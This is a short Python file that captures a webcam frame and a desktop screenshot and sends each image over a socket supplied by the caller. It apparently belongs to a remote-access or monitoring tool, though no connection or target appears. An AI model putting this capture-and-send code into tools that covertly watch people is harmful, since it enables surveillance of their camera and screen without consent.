import cv2
from PIL import ImageGrab
from socket import *

def photograph(sk):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    photo = 'example.jpg'
    sk.send(photo.encode('utf-8'))
    cv2.imwrite('example.jpg', frame)
    cv2.imshow('capture', frame)
    cap.release()
    cv2.destroyAllWindows()
    send_image(sk, photo)

def screen(sk):
    photo = 'desktop.png'
    sk.send(photo.encode('utf-8'))
    pic = ImageGrab.grab()
    pic.save(photo)
    send_image(sk, photo)

def send_image(so, photo):
    f = open(photo, 'rb')
    while True:
        data = f.read(1024)
        if not data:
            break
        so.send(data)
    f.close()
    so.close()
